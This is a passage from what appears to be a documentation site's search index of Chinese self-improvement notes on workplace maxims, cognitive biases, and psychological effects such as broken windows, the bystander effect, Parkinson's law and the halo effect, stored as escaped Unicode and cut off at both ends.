<li>\u5409\u5fb7\u6797\u6cd5\u5219\uff0c\u628a\u95ee\u9898\u6e05\u695a\u7684\u5199\u4e0b\u6765\uff0c\u5c31\u89e3\u51b3\u4e86\u95ee\u9898\u7684\u4e00\u534a\u3002</li> <li>\u5409\u5c14\u4f2f\u7279\u5b9a\u5f8b\uff0c\u5de5\u4f5c\u4e2d\u6700\u5927\u7684\u95ee\u9898\uff0c\u5c31\u662f\u6ca1\u4eba\u7ed9\u4f60\u8bf4\u5982\u4f55\u53bb\u505a</li> <li>\u6c83\u5c14\u6df1\u6cd5\u5219\uff1a\u628a\u4fe1\u606f\u548c\u91d1\u94b1\u6392\u5728\u7b2c\u4e00\u4f4d\uff0c\u91d1\u94b1\u81ea\u4f1a\u5230\u6765</li> <li>\u798f\u514b\u5170\u5b9a\u5f8b\uff0c\u6ca1\u6709\u5fc5\u8981\u505a\u51b3\u5b9a\uff0c\u5c31\u4e0d\u8981\u53bb\u51b3\u5b9a</li> </ol>"},{"location":"note/00-class/#_2","title":"\u4eba\u6027\u8ba4\u77e5\u8bef\u533a","text":"<ul> <li>\u504f\u7231\u6545\u4e8b\u80dc\u4e8e\u6570\u636e\uff1b</li> <li>\u5bfb\u6c42\u5370\u8bc1\u81ea\u5df1\u7684\u60f3\u6cd5\uff1b</li> <li>\u5ffd\u7565\u673a\u7f18\u5de7\u5408\u7684\u4f5c\u7528\uff1b</li> <li>\u9519\u8bef\u611f\u77e5\u4e16\u754c\uff1b</li> <li>\u8fc7\u5ea6\u7b80\u5316\u601d\u7ef4\uff1b</li> <li>\u5b58\u5728\u9519\u8bef\u8bb0\u5fc6\u3002</li> </ul>"},{"location":"note/00-class/#_3","title":"\u4e5d\u578b\u4eba\u683c","text":"- - - \u5b8c\u7f8e\u578b \u7ed9\u4e88\u578b \u5b9e\u8df5\u6027 \u6d6a\u6f2b\u578b \u601d\u8003\u578b \u5fe0\u8bda\u578b \u6d3b\u8dc3\u578b \u9886\u5bfc\u578b \u5e73\u548c\u578b"},{"location":"note/00-class/#-","title":"\u5668 -\u672f -\u9053","text":"<p>\u6280\u3001\u827a\u3001\u672f\u3001\u6cd5\u3001\u9053</p>"},{"location":"note/00-class/#_4","title":"\u81ea\u5f8b\u7279\u5f81","text":"<ul> <li>\u505a\u4e0d\u559c\u6b22\u4f46\u5e94\u8be5\u505a\u7684\u4e8b\u60c5\u3002</li> <li>\u62d2\u7edd\u505a\u559c\u6b22\u4f46\u4e0d\u5e94\u8be5\u505a\u7684\u4e8b\u60c5\u3002</li> <li>\u6709\u5f3a\u70c8\u7684\u76ee\u6807\u611f\u3002</li> <li>\u4e0d\u5728\u65e0\u804a\u7684\u4eba\u548c\u4e8b\u4e0a\u6d6a\u8d39\u65f6\u95f4\u3002</li> </ul>"},{"location":"note/00-class/#_5","title":"\u9e21\u6c64\u8bed\u53e5","text":"<ul> <li>\u9163\u7545\u6dcb\u6f13\u7684\u60c5\u611f\u6325\u6d12\uff0c\u7ede\u5c3d\u8111\u6c41\u7684\u51a5\u601d\u82e6\u60f3\u3002</li> <li>\u575a\u6301\u628a\u7b80\u5355\u7684\u4e8b\u60c5\u505a\u597d\u5c31\u662f\u4e0d\u7b80\u5355\uff0c\u575a\u6301\u628a\u5e73\u51e1\u7684\u4e8b\u60c5\u505a\u597d\u5c31\u662f\u4e0d\u5e73\u51e1\u3002</li> <li>\u7d2f\u7684\u65f6\u5019\uff0c\u591a\u4f11\u606f\uff0c\u82e6\u7684\u65f6\u5019\uff0c\u591a\u575a\u6301\uff0c\u4eba\u751f\u73a9\u7684\u90fd\u662f\u5fc3\u6001\uff0c\u8c01\u7684\u5fc3\u6001\u597d\uff0c\u8c01\u5c31\u73a9\u7684\u6e9c\u3002</li> <li>\u575a\u6301\u662f\u4e00\u79cd\u826f\u597d\u7684\u4e60\u60ef\uff0c\u4f18\u79c0\u7684\u4eba\uff0c\u90fd\u4e60\u60ef\u4e86\u575a\u6301\u3002</li> <li>\u590d\u6742\u7684\u4e8b\u60c5\u7b80\u5355\u7684\u505a\uff0c\u7b80\u5355\u7684\u4e8b\u60c5\u91cd\u590d\u7684\u505a\uff0c\u91cd\u590d\u505a\u7684\u4e8b\u60c5\u7528\u5fc3\u7684\u505a\uff0c\u575a\u6301\u4e0b\u53bb\uff0c\u8fd9\u6837\u5c31\u6ca1\u6709\u505a\u4e0d\u6210\u7684\u4e8b\u60c5\u3002</li> <li>\u7b80\u5355\u7684\u4e8b\u60c5\u91cd\u590d\u505a\uff0c\u4f60\u5c31\u662f\u4e13\u5bb6\uff0c\u91cd\u590d\u7684\u4e8b\u60c5\u4f60\u7528\u5fc3\u505a\uff0c\u4f60\u5c31\u662f\u8d62\u5bb6\u3002</li> <li>\u4e0d\u8bba\u4f55\u65f6\u4f55\u5904\uff0c\u552f\u6709\u81ea\u4fe1\uff0c\u6211\u4eec\u624d\u80fd\u6210\u5c31\u66f4\u597d\u7684\u81ea\u5df1\uff0c\u552f\u6709\u5065\u5eb7\uff0c\u6211\u4eec\u624d\u80fd\u5728\u5de5\u4f5c\u548c\u751f\u6d3b\u4e2d\u6240\u5411\u62ab\u9761\u3002</li> <li>\u7275\u5ff5\u4e8e\u5fc3\u5b88\u4e00\u65b9\u5b81\u9759\u54c1\u4e00\u4efd\u5b64\u72ec\uff0c\u4e8e\u6f2b\u6f2b\u7ea2\u5c18\u4e2d\u643a\u4e00\u7f15\u5b89\u7136\uff0c\u6de1\u6cca\u70df\u706b\u4eba\u95f4\u3002</li> <li>\u4eba\u8d25\u7686\u56e0\u61d2\uff0c\u4e8b\u8d25\u7686\u56e0\u50b2\uff0c\u5bb6\u8d25\u7686\u56e0\u5962\u3002</li> </ul>"},{"location":"note/01-effect/","title":"\u5fc3\u7406\u6548\u5e94","text":"<p>\u6458\u5f55\u4e8e\u534e\u5357\u7406\u5de5\u5927\u5b66</p>"},{"location":"note/01-effect/#_2","title":"\u9e1f\u7b3c\u903b\u8f91","text":"<p>\u6302\u4e00\u4e2a\u6f02\u4eae\u7684\u9e1f\u7b3c\u5728\u623f\u95f4\u91cc\u6700\u663e\u773c\u7684\u5730\u65b9\uff0c\u8fc7\u4e0d\u4e86\u51e0\u5929\uff0c\u4e3b\u4eba\u4e00\u5b9a\u4f1a\u505a\u51fa\u4e0b\u9762\u4e24\u4e2a\u9009\u62e9\u4e4b\u4e00\uff1a\u628a\u9e1f\u7b3c\u6254\u6389\uff0c\u6216\u8005\u4e70\u4e00\u53ea\u9e1f\u56de\u6765\u653e\u5728\u9e1f\u7b3c\u91cc\u3002\u8fd9\u5c31\u662f\u9e1f\u7b3c\u903b\u8f91\u3002\u8fc7\u7a0b\u5f88\u7b80\u5355\uff0c\u8bbe\u60f3\u4f60\u662f\u8fd9\u623f\u95f4\u7684\u4e3b\u4eba\uff0c\u53ea\u8981\u6709\u4eba\u8d70\u8fdb\u623f\u95f4\uff0c\u770b\u5230\u9e1f\u7b3c\uff0c\u5c31\u4f1a\u5fcd\u4e0d\u4f4f\u95ee\u4f60\uff1a\u201c\u9e1f\u5462\uff1f\u662f\u4e0d\u662f\u6b7b\u4e86\uff1f\u201d\u5f53\u4f60\u56de\u7b54\uff1a\u201c\u6211\u4ece\u6765\u90fd\u6ca1\u6709\u517b\u8fc7\u9e1f\u3002\u201d\u4eba\u4eec\u4f1a\u95ee\uff1a\u201c\u90a3\u4e48\uff0c\u4f60\u8981\u4e00\u4e2a\u9e1f\u7b3c\u5e72\u4ec0\u4e48\uff1f\u201d\u6700\u540e\u4f60\u4e0d\u5f97\u4e0d\u5728\u4e24\u4e2a\u9009\u62e9\u4e2d\u4e8c\u9009\u4e00\uff0c\u56e0\u4e3a\u8fd9\u6bd4\u65e0\u4f11\u6b62\u7684\u89e3\u91ca\u8981\u5bb9\u6613\u5f97\u591a\u3002\u9e1f\u7b3c\u903b\u8f91\u7684\u539f\u56e0\u5f88\u7b80\u5355\uff1a\u4eba\u4eec\u7edd\u5927\u90e8\u5206\u7684\u65f6\u5019\u662f\u91c7\u53d6\u60ef\u6027\u601d\u7ef4\u3002\u6240\u4ee5\u53ef\u89c1\u5728\u751f\u6d3b\u548c\u5de5\u4f5c\u4e2d\u57f9\u517b\u903b\u8f91\u601d\u7ef4\u662f\u591a\u4e48\u91cd\u8981\u3002</p>"},{"location":"note/01-effect/#_3","title":"\u7834\u7a97\u6548\u5e94","text":"<p>\u5fc3\u7406\u5b66\u7684\u7814\u7a76\u4e0a\u6709\u4e2a\u73b0\u8c61\u53eb\u505a\u201c\u7834\u7a97\u6548\u5e94\u201d\uff0c\u5c31\u662f\u8bf4\uff0c\u4e00\u4e2a\u623f\u5b50\u5982\u679c\u7a97\u6237\u7834\u4e86\uff0c\u6ca1\u6709\u4eba\u53bb\u4fee\u8865\uff0c\u9694\u4e0d\u4e45\uff0c\u5176\u5b83\u7684\u7a97\u6237\u4e5f\u4f1a\u83ab\u540d\u5176\u5999\u7684\u88ab\u4eba\u6253\u7834\uff1b\u4e00\u9762\u5899\uff0c\u5982\u679c\u51fa\u73b0\u4e00\u4e9b\u6d82\u9e26\u6ca1\u6709\u6e05\u6d17\u6389\uff0c\u5f88\u5feb\u7684\uff0c\u5899\u4e0a\u5c31\u5e03\u6ee1\u4e86\u4e71\u4e03\u516b\u7cdf\uff0c\u4e0d\u582a\u5165\u76ee\u7684\u4e1c\u897f\u3002\u4e00\u4e2a\u5f88\u5e72\u51c0\u7684\u5730\u65b9\uff0c\u4eba\u4f1a\u4e0d\u597d\u610f\u601d\u4e22\u5783\u573e\uff0c\u4f46\u662f\u4e00\u65e6\u5730\u4e0a\u6709\u5783\u573e\u51fa\u73b0\u4e4b\u540e\uff0c\u4eba\u5c31\u4f1a\u6beb\u4e0d\u72b9\u7591\u7684\u62cb\uff0c\u4e1d\u6beb\u4e0d\u89c9\u7f9e\u6127\u3002\u8fd9\u771f\u662f\u5f88\u5947\u602a\u7684\u73b0\u8c61\u3002</p> <p>\u5fc3\u7406\u5b66\u5bb6\u7814\u7a76\u7684\u5c31\u662f\u8fd9\u4e2a\u201c\u5f15\u7206\u70b9\u201d\uff0c\u5730\u4e0a\u7a76\u7adf\u8981\u6709\u591a\u810f\uff0c\u4eba\u4eec\u624d\u4f1a\u89c9\u5f97\u53cd\u6b63\u8fd9\u4e48\u810f\uff0c\u518d\u810f\u4e00\u70b9\u65e0\u6240\u8c13\uff0c\u60c5\u51b5\u7a76\u7adf\u8981\u574f\u5230\u4ec0\u4e48\u7a0b\u5ea6\uff0c\u4eba\u4eec\u624d\u4f1a\u81ea\u66b4\u81ea\u5f03\uff0c\u8ba9\u5b83\u70c2\u5230\u5e95\u3002</p> <p>\u4efb\u4f55\u574f\u4e8b\uff0c\u5982\u679c\u5728\u5f00\u59cb\u65f6\u6ca1\u6709\u963b\u62e6\u6389\uff0c\u5f62\u6210\u98ce\u6c14\uff0c\u6539\u4e5f\u6539\u4e0d\u6389\uff0c\u5c31\u597d\u8c61\u6cb3\u5824\uff0c\u4e00\u4e2a\u5c0f\u7f3a\u53e3\u6ca1\u6709\u53ca\u65f6\u4fee\u8865\uff0c\u53ef\u4ee5\u5d29\u575d\uff0c\u9020\u6210\u5343\u767e\u4e07\u500d\u7684\u635f\u5931\u3002</p> <p>\u72af\u7f6a\u5176\u5b9e\u5c31\u662f\u5931\u5e8f\u7684\u7ed3\u679c\uff0c\u7ebd\u7ea6\u5e02\u572880\u5e74\u4ee3\u7684\u65f6\u5019\uff0c\u771f\u662f\u65e0\u5904\u4e0d\u62a2\uff0c\u65e0\u65e5\u4e0d\u6740\uff0c\u5927\u767d\u5929\u8d70\u5728\u9a6c\u8def\u4e0a\u4e5f\u4f1a\u5bb3\u6015\u3002\u5730\u94c1\u66f4\u4e0d\u7528\u8bf4\u4e86\uff0c\u8f66\u53a2\u810f\u4e71\uff0c\u5230\u5904\u6d82\u6ee1\u4e86\u79fd\u53e5\uff0c\u5750\u5728\u5730\u94c1\u91cc\uff0c\u4eba\u4eba\u81ea\u5371\u3002\u6211\u867d\u7136\u6ca1\u6709\u88ab\u62a2\u8fc7\uff0c\u4f46\u662f\u6709\u4f4d\u6559\u6388\u88ab\u4eba\u5728\u5149\u5929\u5316\u65e5\u4e4b\u4e0b\uff0c\u6572\u4e86\u4e00\u8bb0\u95f7\u68cd\uff0c\u773c\u775b\u5931\u660e\uff0c\u4ece\u6b64\u7ed3\u675f\u4ed6\u7684\u7814\u7a76\u751f\u6daf\uff0c\u4f7f\u6211\u591a\u5c11\u5e74\u6765\u8c08\u864e\u53d8\u8272\uff0c\u4e0d\u6562\u53ea\u8eab\u53bb\u7ebd\u7ea6\u5f00\u4f1a\u3002\u6700\u8fd1\u7ebd\u7ea6\u7684\u5e02\u5bb9\u548c\u5e02\u8a89\u63d0\u5347\u4e86\u4e0d\u5c11\uff0c\u4ee4\u6211\u9887\u4e3a\u5403\u60ca\uff0c\u4e00\u4e2a\u5df2\u7ecf\u5411\u4e0b\u6c89\u6ca6\u7684\u57ce\u5e02\uff0c\u7adf\u80fd\u6b7b\u800c\u590d\u751f\uff0c\u5411\u4e0a\u63d0\u5347\u3002</p> <p>\u56e0\u6b64\uff0c\u5f53\u6211\u51fa\u53bb\u5f00\u4f1a\uff0c\u78b0\u5230\u4e00\u4f4d\u72af\u7f6a\u5b66\u5bb6\u65f6\uff0c\u7acb\u523b\u5411\u4ed6\u8ba8\u6559\uff0c\u539f\u6765\u7ebd\u7ea6\u5e02\u7528\u7684\u5c31\u662f\u8fc7\u53bb\u4e66\u672c\u4e0a\u8bb2\u7684\u7834\u7a97\u6548\u5e94\u7684\u7406\u8bba\uff0c\u5148\u6539\u5584\u72af\u7f6a\u7684\u73af\u5883\uff0c\u4f7f\u4eba\u4eec\u4e0d\u6613\u72af\u7f6a\uff0c\u518d\u6162\u6162\u7f09\u51f6\u6355\u76d7\uff0c\u56de\u5f52\u79e9\u5e8f\u3002</p> <p>\u5f53\u65f6\u8fd9\u4e2a\u505a\u6cd5\u867d\u7136\u88ab\u4eba\u9a82\u4e3a\u7f13\u4e0d\u6d4e\u6025\uff0c\u201c\u8239\u90fd\u8981\u6c89\u4e86\u8fd8\u5728\u6d17\u7532\u677f\u201d\uff0c\u4f46\u662f\u7ebd\u7ea6\u5e02\u8fd8\u662f\u4ece\u7ef4\u62a4\u5730\u94c1\u8f66\u53a2\u5e72\u51c0\u7740\u624b\uff0c\u5e76\u5c06\u4e0d\u4e70\u8f66\u7968\u767d\u642d\u8f66\u7684\u4eba\u7528\u624b\u94d0\u94d0\u4f4f\u6392\u6210\u4e00\u5217\u7ad9\u5728\u6708\u53f0\u4e0a\uff0c\u516c\u5f00\u5411\u6c11\u4f17\u5ba3\u793a\u653f\u5e9c\u6574\u987f\u7684\u51b3\u5fc3\uff0c\u7ed3\u679c\u53d1\u73b0\u975e\u5e38\u6709\u6548\u3002</p> <p>\u8b66\u5bdf\u53d1\u73b0\u4eba\u4eec\u679c\u7136\u6bd4\u8f83\u4e0d\u4f1a\u5728\u5e72\u51c0\u7684\u573a\u5408\u72af\u7f6a\uff0c\u53c8\u53d1\u73b0\u6293\u9003\u7968\u5f88\u6709\u6536\u83b7\uff0c\u56e0\u4e3a\u6bcf\u4e03\u540d\u9003\u7968\u7684\u4eba\u4e2d\u5c31\u6709\u4e00\u540d\u662f\u901a\u7f09\u72af\uff0c\u4e8c\u5341\u540d\u4e2d\u5c31\u6709\u4e00\u540d\u643a\u5e26\u6b66\u5668\uff0c\u56e0\u6b64\u8b66\u5bdf\u613f\u610f\u5f88\u8ba4\u771f\u5730\u53bb\u6293\u9003\u7968\uff0c\u8fd9\u4f7f\u5f97\u6b79\u5f92\u4e0d\u6562\u9003\u7968\uff0c\u51fa\u95e8\u4e0d\u6562\u5e26\u6b66\u5668\uff0c\u4ee5\u514d\u5f97\u4e0d\u507f\u5931\u3001\u56e0\u5c0f\u5931\u5927\u3002\u8fd9\u6837\u7ebd\u7ea6\u5e02\u5c31\u4ece\u6700\u5c0f\u3001\u6700\u5bb9\u6613\u7684\u5730\u65b9\u7740\u624b\uff0c\u6253\u7834\u4e86\u72af\u7f6a\u73af\u7ed3(chain)\uff0c\u4f7f\u8fd9\u4e2a\u6076\u6027\u5faa\u73af\u65e0\u6cd5\u7ee7\u7eed\u4e0b\u53bb\u3002</p>"},{"location":"note/01-effect/#_4","title":"\u8d23\u4efb\u5206\u6563\u6548\u5e94","text":"<p>1964\u5e743\u670813\u65e5\u591c3\u65f620\u5206\uff0c\u5728\u7f8e\u56fd\u7ebd\u7ea6\u90ca\u5916\u67d0\u516c\u5bd3\u524d\uff0c\u4e00\u4f4d\u53eb\u6731\u8bfa\u6bd4\u767d\u7684\u5e74\u8f7b\u5973\u5b50\u5728\u7ed3\u675f\u9152\u5df4\u95f4\u5de5\u4f5c\u56de\u5bb6\u7684\u8def\u4e0a\u9047\u523a\u3002\u5f53\u5979\u7edd\u671b\u5730\u558a\u53eb\uff1a\u201c\u6709\u4eba\u8981\u6740\u4eba\u5566!\u6551\u547d!\u6551\u547d!\u201d\u542c\u5230\u558a\u53eb\u58f0\uff0c\u9644\u8fd1\u4f4f\u6237\u4eae\u8d77\u4e86\u706f\uff0c\u6253\u5f00\u4e86\u7a97\u6237\uff0c\u51f6\u624b\u5413\u8dd1\u4e86\u3002\u5f53\u4e00\u5207\u6062\u590d\u5e73\u9759\u540e\uff0c\u51f6\u624b\u53c8\u8fd4\u56de\u4f5c\u6848\u3002\u5f53\u5979\u53c8\u53eb\u558a\u65f6\uff0c\u9644\u8fd1\u7684\u4f4f\u6237\u53c8\u6253\u5f00\u4e86\u7535\u706f\uff0c\u51f6\u624b\u53c8\u9003\u8dd1\u4e86\u3002\u5f53\u5979\u8ba4\u4e3a\u5df2\u7ecf\u65e0\u4e8b\uff0c\u56de\u5230\u81ea\u5df1\u5bb6\u4e0a\u697c\u65f6\uff0c\u51f6\u624b\u53c8\u4e00\u6b21\u51fa\u73b0\u5728\u5979\u9762\u524d\uff0c\u5c06\u5979\u6740\u6b7b\u5728\u697c\u68af\u4e0a\u3002\u5728\u8fd9\u4e2a\u8fc7\u7a0b\u4e2d\uff0c\u5c3d\u7ba1\u5979\u5927\u58f0\u547c\u6551\uff0c\u5979\u7684\u90bb\u5c45\u4e2d\u81f3\u5c11\u670938\u4f4d\u5230\u7a97\u524d\u89c2\u770b\uff0c\u4f46\u65e0\u4e00\u4eba\u6765\u6551\u5979\uff0c\u751a\u81f3\u65e0\u4e00\u4eba\u6253\u7535\u8bdd\u62a5\u8b66\u3002\u8fd9\u4ef6\u4e8b\u5f15\u8d77\u7ebd\u7ea6\u793e\u4f1a\u7684\u8f70\u52a8\uff0c\u4e5f\u5f15\u8d77\u4e86\u793e\u4f1a\u5fc3\u7406\u5b66\u5de5\u4f5c\u8005\u7684\u91cd\u89c6\u548c\u601d\u8003\u3002\u4eba\u4eec\u628a\u8fd9\u79cd\u4f17\u591a\u7684\u65c1\u89c2\u8005\u89c1\u6b7b\u4e0d\u6551\u7684\u73b0\u8c61\u79f0\u4e3a\u8d23\u4efb\u5206\u6563\u6548\u5e94\u3002</p> <p>\u5bf9\u4e8e\u8d23\u4efb\u5206\u6563\u6548\u5e94\u5f62\u6210\u7684\u539f\u56e0\uff0c\u5fc3\u7406\u5b66\u5bb6\u8fdb\u884c\u4e86\u5927\u91cf\u7684\u5b9e\u9a8c\u548c\u8c03\u67e5\uff0c\u7ed3\u679c\u53d1\u73b0\uff1a\u8fd9\u79cd\u73b0\u8c61\u4e0d\u80fd\u4ec5\u4ec5\u8bf4\u662f\u4f17\u4eba\u7684\u51b7\u9177\u65e0\u60c5\uff0c\u6216\u9053\u5fb7\u65e5\u76ca\u6ca6\u4e27\u7684\u8868\u73b0\u3002\u56e0\u4e3a\u5728\u4e0d\u540c\u7684\u573a\u5408\uff0c\u4eba\u4eec\u7684\u63f4\u52a9\u884c\u4e3a\u786e\u5b9e\u662f\u4e0d\u540c\u7684\u3002\u5f53\u4e00\u4e2a\u4eba\u9047\u5230\u7d27\u6025\u60c5\u5883\u65f6\uff0c\u5982\u679c\u53ea\u6709\u4ed6\u4e00\u4e2a\u4eba\u80fd\u63d0\u4f9b\u5e2e\u52a9\uff0c\u4ed6\u4f1a\u6e05\u9192\u5730\u610f\u8bc6\u5230\u81ea\u5df1\u7684\u8d23\u4efb\uff0c\u5bf9\u53d7\u96be\u8005\u7ed9\u4e88\u5e2e\u52a9\u3002\u5982\u679c\u4ed6\u89c1\u6b7b\u4e0d\u6551\u4f1a\u4ea7\u751f\u7f6a\u6076\u611f\u3001\u5185\u759a\u611f\uff0c\u8fd9\u9700\u8981\u4ed8\u51fa\u5f88\u9ad8\u7684\u5fc3\u7406\u4ee3\u4ef7\u3002\u800c\u5982\u679c\u6709\u8bb8\u591a\u4eba\u5728\u573a\u7684\u8bdd\uff0c\u5e2e\u52a9\u6c42\u52a9\u8005\u7684\u8d23\u4efb\u5c31\u7531\u5927\u5bb6\u6765\u5206\u62c5\uff0c\u9020\u6210\u8d23\u4efb\u5206\u6563\uff0c\u6bcf\u4e2a\u4eba\u5206\u62c5\u7684\u8d23\u4efb\u5f88\u5c11\uff0c\u65c1\u89c2\u8005\u751a\u81f3\u53ef\u80fd\u8fde\u4ed6\u81ea\u5df1\u7684\u90a3\u4e00\u4efd\u8d23\u4efb\u4e5f\u610f\u8bc6\u4e0d\u5230\uff0c\u4ece\u800c\u4ea7\u751f\u4e00\u79cd\u201c\u6211\u4e0d\u53bb\u6551\uff0c\u7531\u522b\u4eba\u53bb\u6551\u201d\u7684\u5fc3\u7406\uff0c\u9020\u6210\u201c\u96c6\u4f53\u51b7\u6f20\u201d\u7684\u5c40\u9762\u3002\u5982\u4f55\u6253\u7834\u8fd9\u79cd\u5c40\u9762\uff0c\u8fd9\u662f\u5fc3\u7406\u5b66\u5bb6\u6b63\u5728\u7814\u7a76\u7684\u4e00\u4e2a\u91cd\u8981\u8bfe\u9898\u3002</p>"},{"location":"note/01-effect/#_5","title":"\u5e15\u91d1\u68ee\u5b9a\u5f8b","text":"<p>\u82f1\u56fd\u8457\u540d\u5386\u53f2\u5b66\u5bb6\u8bfa\u65af\u53e4\u5fb7\u00b7\u5e15\u91d1\u68ee\u901a\u8fc7\u957f\u671f\u8c03\u67e5\u7814\u7a76\uff0c\u5199\u51fa\u4e00\u672c\u540d\u53eb\u300a\u5e15\u91d1\u68ee\u5b9a\u5f8b\u300b\u7684\u4e66\u3002\u4ed6\u5728\u4e66\u4e2d\u9610\u8ff0\u4e86\u673a\u6784\u4eba\u5458\u81a8\u80c0\u7684\u539f\u56e0\u53ca\u540e\u679c\uff1a\u4e00\u4e2a\u4e0d\u79f0\u804c\u7684\u5b98\u5458\uff0c\u53ef\u80fd\u6709\u4e09\u6761\u51fa\u8def\uff0c\u7b2c\u4e00\u662f\u7533\u8bf7\u9000\u804c\uff0c\u628a\u4f4d\u5b50\u8ba9\u7ed9\u80fd\u5e72\u7684\u4eba\uff1b\u7b2c\u4e8c\u662f\u8ba9\u4e00\u4f4d\u80fd\u5e72\u7684\u4eba\u6765\u534f\u52a9\u81ea\u5df1\u5de5\u4f5c\uff1b\u7b2c\u4e09\u662f\u4efb\u7528\u4e24\u4e2a\u6c34\u5e73\u6bd4\u81ea\u5df1\u66f4\u4f4e\u7684\u4eba\u5f53\u52a9\u624b\u3002\u8fd9\u7b2c\u4e00\u6761\u8def\u662f\u4e07\u4e07\u8d70\u4e0d\u5f97\u7684\uff0c\u56e0\u4e3a\u90a3\u6837\u4f1a\u4e27\u5931\u8bb8\u591a\u6743\u5229\uff1b\u7b2c\u4e8c\u6761\u8def\u4e5f\u4e0d\u80fd\u8d70\uff0c\u56e0\u4e3a\u90a3\u4e2a\u80fd\u5e72\u7684\u4eba\u4f1a\u6210\u4e3a\u81ea\u5df1\u7684\u5bf9\u624b\uff1b\u770b\u6765\u53ea\u6709\u7b2c\u4e09\u6761\u8def\u6700\u9002\u5b9c\u3002\u4e8e\u662f\uff0c\u4e24\u4e2a\u5e73\u5eb8\u7684\u52a9\u624b\u5206\u62c5\u4e86\u4ed6\u7684\u5de5\u4f5c\uff0c\u4ed6\u81ea\u5df1\u5219\u9ad8\u9ad8\u5728\u4e0a\u53d1\u53f7\u65bd\u4ee4\uff0c\u4ed6\u4eec\u4e0d\u4f1a\u5bf9\u81ea\u5df1\u7684\u6743\u5229\u6784\u6210\u5a01\u80c1\u3002\u4e24\u4e2a\u52a9\u624b\u65e2\u7136\u65e0\u80fd\uff0c\u4ed6\u4eec\u5c31\u4e0a\u884c\u4e0b\u6548\uff0c\u518d\u4e3a\u81ea\u5df1\u627e\u4e24\u4e2a\u66f4\u52a0\u65e0\u80fd\u7684\u52a9\u624b\u3002\u5982\u6b64\u7c7b\u63a8\uff0c\u5c31\u5f62\u6210\u4e86\u4e00\u4e2a\u673a\u6784\u81c3\u80bf\uff0c\u4eba\u6d6e\u4e8e\u4e8b\uff0c\u76f8\u4e92\u626f\u76ae\uff0c\u6548\u7387\u4f4e\u4e0b\u7684\u9886\u5bfc\u4f53\u7cfb\u3002</p>"},{"location":"note/01-effect/#_6","title":"\u6655\u8f6e\u6548\u5e94","text":"<p>\u4fc4\u56fd\u8457\u540d\u7684\u5927\u6587\u8c6a\u666e\u5e0c\u91d1\u66fe\u56e0\u6655\u8f6e\u6548\u5e94\u7684\u4f5c\u7528\u5403\u4e86\u5927\u82e6\u5934\u3002\u4ed6\u72c2\u70ed\u5730\u7231\u4e0a\u4e86\u88ab\u79f0\u4e3a\u201c\u83ab\u65af\u79d1\u7b2c\u4e00\u7f8e\u4eba\u201d\u7684\u5a1c\u5766\u4e3d\uff0c\u5e76\u4e14\u548c\u5979\u7ed3\u4e86\u5a5a\u3002\u5a1c\u5766\u4e3d\u5bb9\u8c8c\u60ca\u4eba\uff0c\u4f46\u4e0e\u666e\u5e0c\u91d1\u5fd7\u4e0d\u540c\u9053\u4e0d\u5408\u3002\u5f53\u666e\u5e0c\u91d1\u6bcf\u6b21\u628a\u5199\u597d\u7684\u8bd7\u8bfb\u7ed9\u5979\u542c\u65f6\u3002\u5979\u603b\u662f\u6342\u7740\u8033\u6735\u8bf4\uff1a\u201c\u4e0d\u8981\u542c\uff01\u4e0d\u8981\u542c\uff01\u201d\u76f8\u53cd\uff0c\u5979\u603b\u662f\u8981\u666e\u5e0c\u91d1\u966a\u5979\u6e38\u4e50\uff0c\u51fa\u5e2d\u4e00\u4e9b\u8c6a\u534e\u7684\u665a\u4f1a\u3001\u821e\u4f1a\uff0c\u666e\u5e0c\u91d1\u4e3a\u6b64\u4e22\u4e0b\u521b\u4f5c\uff0c\u5f04\u5f97\u503a\u53f0\u9ad8\u7b51\uff0c\u6700\u540e\u8fd8\u4e3a\u5979\u51b3\u6597\u800c\u6b7b\uff0c\u4f7f\u4e00\u9897\u6587\u5b66\u5de8\u661f\u8fc7\u65e9\u5730\u9668\u843d\u3002\u5728\u666e\u5e0c\u91d1\u770b\u6765\uff0c\u4e00\u4e2a\u6f02\u4eae\u7684\u5973\u4eba\u4e5f\u5fc5\u7136\u6709\u975e\u51e1\u7684\u667a\u6167\u548c\u9ad8\u8d35\u7684\u54c1\u683c\uff0c\u7136\u800c\u4e8b\u5b9e\u5e76\u975e\u5982\u6b64\uff0c\u8fd9\u79cd\u73b0\u8c61\u88ab\u79f0\u4e3a\u6655\u8f6e\u6548\u5e94\u3002</p> <p>\u6240\u8c13\u6655\u8f6e\u6548\u5e94\uff0c\u5c31\u662f\u5728\u4eba\u9645\u4ea4\u5f80\u4e2d\uff0c\u4eba\u8eab\u4e0a\u8868\u73b0\u51fa\u7684\u67d0\u4e00\u65b9\u9762\u7684\u7279\u5f81\uff0c\u63a9\u76d6\u4e86\u5176\u4ed6\u7279\u5f81\uff0c\u4ece\u800c\u9020\u6210\u4eba\u9645\u8ba4\u77e5\u7684\u969c\u788d\u3002\u5728\u65e5\u5e38\u751f\u6d3b\u4e2d\uff0c\u201c\u6655\u8f6e\u6548\u5e94\u201d\u5f80\u5f80\u5728\u6084\u6084\u5730\u5f71\u54cd\u7740\u6211\u4eec\u5bf9\u522b\u4eba\u7684\u8ba4\u77e5\u548c\u8bc4\u4ef7\u3002\u6bd4\u5982\u6709\u7684\u8001\u5e74\u4eba\u5bf9\u9752\u5e74\u4eba\u7684\u4e2a\u522b\u7f3a\u70b9\uff0c\u6216\u8863\u7740\u6253\u626e\u3001\u751f\u6d3b\u4e60\u60ef\u770b\u4e0d\u987a\u773c\uff0c\u5c31\u8ba4\u4e3a\u4ed6\u4eec\u4e00\u5b9a\u6ca1\u51fa\u606f\uff1b\u6709\u7684\u9752\u5e74\u4eba\u7531\u4e8e\u503e\u6155\u670b\u53cb\u7684\u67d0\u4e00\u53ef\u7231\u4e4b\u5904\uff0c\u5c31\u4f1a\u628a\u4ed6\u770b\u5f97\u5904\u5904\u53ef\u7231\uff0c\u771f\u6240\u8c13\u201c\u4e00\u4fca\u906e\u767e\u4e11\u201d\u3002\u6655\u8f6e\u6548\u5e94\u662f\u4e00\u79cd\u4ee5\u504f\u6982\u5168\u7684\u4e3b\u89c2\u5fc3\u7406\u81c6\u6d4b\uff0c\u5176\u9519\u8bef\u5728\u4e8e\uff1a\u7b2c\u4e00\uff0c\u5b83\u5bb9\u6613\u6293\u4f4f\u4e8b\u7269\u7684\u4e2a\u522b\u7279\u5f81\uff0c\u4e60\u60ef\u4ee5\u4e2a\u522b\u63a8\u53ca\u4e00\u822c\uff0c\u5c31\u50cf\u76f2\u4eba\u6478\u8c61\u4e00\u6837\uff0c\u4ee5\u70b9\u4ee3\u9762\uff1b\u7b2c\u4e8c\uff0c\u5b83\u628a\u5e76\u65e0\u5185\u5